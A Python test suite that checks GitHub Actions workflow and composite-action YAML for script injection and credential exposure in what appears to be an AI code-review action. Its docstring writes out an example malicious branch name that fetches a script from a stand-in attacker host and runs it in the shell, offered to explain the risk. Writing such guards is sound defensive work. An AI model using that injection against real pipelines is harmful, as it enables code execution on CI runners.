#!/usr/bin/env python3
"""
Structural checks on the YAML this workstream ships.

The important one is `NoExpressionInRunBlocksTest`. On a `pull_request` event
an outside contributor controls the branch name, the pull request title and
body, and their own login. `git check-ref-format` forbids spaces, `~`, `^`,
`:`, `?`, `*`, `[` and `\\` in a ref -- but permits `;`, `&`, `|`, `$`,
backticks, parentheses and both quote characters, and `$IFS` substitutes for
the forbidden space. So a branch named

    evil";curl$IFS-s$IFSattacker.example/x|sh;#

is legal, and `${{ github.event.pull_request.head.ref }}` inside a `run:` body
pastes it straight into the shell source the runner executes. This is the
canonical GitHub Actions script-injection class, it is invisible in review, and
the mitigation -- bind to `env:` and reference `"$VAR"` -- is cheap. So it is
enforced mechanically here rather than left to reviewer vigilance.

`actionlint` covers `.github/workflows/`, but composite `action.yml` files are
outside its scope, and `action/action.yml` is where most of this workstream's
shell actually lives. These tests close that gap. The scanner is line-based on
purpose: it needs no YAML parser, so it runs under the same stdlib-only rule as
everything else here.
"""
import glob
import os
import re
import shutil
import subprocess
import sys
import tempfile
import unittest

ROOT = os.path.normpath(
    os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "..")
)

RUN_BLOCK_START = re.compile(r"^(?P<indent>\s*)-?\s*run:\s*(?P<rest>.*)$")
EXPRESSION = re.compile(r"\$\{\{")


def yaml_files():
    paths = sorted(
        glob.glob(os.path.join(ROOT, ".github", "workflows", "*.yml"))
        + glob.glob(os.path.join(ROOT, ".github", "workflows", "*.yaml"))
        + glob.glob(os.path.join(ROOT, "action", "examples", "*.yml"))
        + [os.path.join(ROOT, "action", "action.yml")]
    )
    return [p for p in paths if os.path.exists(p)]


def run_blocks(path):
    """Yield (start_line, indent, script) for every `run:` in a YAML file.

    Line-based rather than parsed. A block scalar's body is every following
    line indented past the `run:` key, which is enough structure for this and
    avoids a YAML dependency.
    """
    with open(path, encoding="utf-8") as fh:
        lines = fh.read().split("\n")

    i = 0
    while i < len(lines):
        match = RUN_BLOCK_START.match(lines[i])
        if not match:
            i += 1
            continue
        indent = len(match.group("indent"))
        rest = match.group("rest").strip()
        start = i + 1

        if rest and rest[0] not in ("|", ">"):
            # Inline form: `run: some command`
            yield start, indent, rest
            i += 1
            continue

        body = []
        i += 1
        while i < len(lines):
            line = lines[i]
            if line.strip() and (len(line) - len(line.lstrip())) <= indent:
                break
            body.append(line)
            i += 1
        yield start, indent, "\n".join(body)


class NoExpressionInRunBlocksTest(unittest.TestCase):
    def test_no_run_block_interpolates_an_expression(self):
        offenders = []
        for path in yaml_files():
            for start, _indent, script in run_blocks(path):
                for offset, line in enumerate(script.split("\n")):
                    if EXPRESSION.search(line):
                        rel = os.path.relpath(path, ROOT)
                        offenders.append(f"{rel}:{start + offset}: {line.strip()}")

        self.assertEqual(
            offenders,
            [],
            "Expression interpolation inside a `run:` body is command injection "
            "when any part of it is attacker-controlled. Bind the value with "
            "`env:` and reference it as \"$VAR\".\n  " + "\n  ".join(offenders),
        )

    def test_the_scanner_actually_detects_the_pattern(self):
        # A guard that never fires is indistinguishable from a guard that
        # cannot fire. Prove the scanner sees a planted violation.
        with tempfile.TemporaryDirectory() as tmp:
            path = os.path.join(tmp, "bad.yml")
            with open(path, "w", encoding="utf-8") as fh:
                fh.write(
                    "jobs:\n"
                    "  a:\n"
                    "    steps:\n"
                    "      - run: |\n"
                    "          echo ${{ github.head_ref }}\n"
                    "      - name: safe\n"
                    "        run: echo done\n"
                )
            blocks = list(run_blocks(path))
            self.assertEqual(len(blocks), 2)
            self.assertTrue(any(EXPRESSION.search(b[2]) for b in blocks))
            self.assertFalse(EXPRESSION.search(blocks[1][2]))


class ShellcheckTest(unittest.TestCase):
    """Run shellcheck over the composite action's scripts when available.

    actionlint already does this for `.github/workflows/`, but composite
    action files are outside its scope and `action/action.yml` is where most
    of the shell in this workstream lives.
    """

    @unittest.skipUnless(shutil.which("shellcheck"), "shellcheck not installed")
    def test_composite_action_shell_is_clean(self):
        path = os.path.join(ROOT, "action", "action.yml")
        failures = []
        for start, _indent, script in run_blocks(path):
            # Strip leading indentation so shellcheck sees ordinary script text.
            lines = script.split("\n")
            pad = min(
                (len(ln) - len(ln.lstrip()) for ln in lines if ln.strip()),
                default=0,
            )
            body = "\n".join(ln[pad:] for ln in lines)
            proc = subprocess.run(
                [
                    "shellcheck",
                    "--shell=bash",
                    # SC2086 et al still apply; these two are noise for the
                    # Actions idiom of writing to $GITHUB_OUTPUT.
                    "--exclude=SC2129",
                    "-",
                ],
                input=f"#!/usr/bin/env bash\n{body}\n",
                capture_output=True,
                text=True,
                check=False,
            )
            if proc.returncode != 0:
                failures.append(f"action.yml run block at line {start}:\n{proc.stdout}")
        self.assertEqual(failures, [], "\n\n".join(failures))


class ActionContractTest(unittest.TestCase):
    """Cheap structural assertions about action.yml, parser-free."""

    def setUp(self):
        with open(os.path.join(ROOT, "action", "action.yml"), encoding="utf-8") as fh:
            self.text = fh.read()

    def test_defaults_are_safe(self):
        # The hard gate: dry-run and non-blocking everywhere by default.
        self.assertRegex(self.text, r"dry_run:\s*\n(?:.*\n)*?\s*default:\s*'true'")
        self.assertRegex(self.text, r"blocking:\s*\n(?:.*\n)*?\s*default:\s*'false'")
        self.assertRegex(self.text, r"skip_forks:\s*\n(?:.*\n)*?\s*default:\s*'true'")
        self.assertRegex(self.text, r"skip_drafts:\s*\n(?:.*\n)*?\s*default:\s*'true'")

    def test_the_agent_step_has_no_github_credential(self):
        # Locate the `review` step's env block and assert what is in it. This
        # is the security boundary; a token added here later should break a
        # test rather than pass review.
        marker = "    - id: review\n"
        self.assertIn(marker, self.text)
        chunk = self.text.split(marker, 1)[1].split("      run: |", 1)[0]
        for forbidden in ("GITHUB_TOKEN", "app_private_key", "app_id", "token_open", "token_post"):
            self.assertNotIn(
                forbidden,
                chunk,
                f"{forbidden} must not be reachable from the agent step",
            )
        self.assertIn("ANTHROPIC_API_KEY", chunk)

    def test_the_finalizer_always_runs(self):
        self.assertIn("    - id: finalize\n      if: ${{ always()", self.text)

    def test_every_checkout_disables_credential_persistence(self):
        # The workspace is attacker-authored and the parent reads .git/config
        # out of it, so a persisted token would be sitting inside the blast
        # radius. Count declarations rather than mentions: the rationale also
        # appears in a comment, and a test that matches prose rots the moment
        # somebody rewords it.
        checkouts = len(
            re.findall(r"^\s*(?:-\s+)?uses:\s*actions/checkout@", self.text, re.M)
        )
        disables = len(
            re.findall(r"^\s*persist-credentials:\s*false\s*$", self.text, re.M)
        )
        self.assertGreater(checkouts, 0)
        self.assertEqual(
            disables,
            checkouts,
            f"{checkouts} checkout step(s) but {disables} persist-credentials: false",
        )
        self.assertIsNone(
            re.search(r"^\s*persist-credentials:\s*true\s*$", self.text, re.M)
        )

    def test_no_pull_request_target_trigger(self):
        # The string appears in a comment explaining why it is never used, so
        # match the trigger declaration rather than the bare word.
        self.assertIsNone(re.search(r"^\s*pull_request_target:", self.text, re.M))


class WorkflowContractTest(unittest.TestCase):
    def test_no_workflow_uses_pull_request_target(self):
        trigger = re.compile(r"^\s*pull_request_target:", re.MULTILINE)
        for path in yaml_files():
            with open(path, encoding="utf-8") as fh:
                self.assertIsNone(
                    trigger.search(fh.read()),
                    f"{os.path.relpath(path, ROOT)} declares pull_request_target",
                )

    def test_reusable_workflow_enumerates_concurrency(self):
        path = os.path.join(ROOT, ".github", "workflows", "ai-review.yml")
        with open(path, encoding="utf-8") as fh:
            text = fh.read()
        self.assertIn("cancel-in-progress: true", text)

    def test_consumer_example_enumerates_every_trigger_action(self):
        path = os.path.join(ROOT, "action", "examples", "consumer-workflow.yml")
        with open(path, encoding="utf-8") as fh:
            text = fh.read()
        for action in ("opened", "reopened", "ready_for_review", "synchronize", "closed"):
            self.assertRegex(text, rf"-\s+{action}\b", f"missing trigger: {action}")
        self.assertIn("cancel-in-progress: true", text)


if __name__ == "__main__":
    sys.exit(0 if unittest.main(exit=False).result.wasSuccessful() else 1)
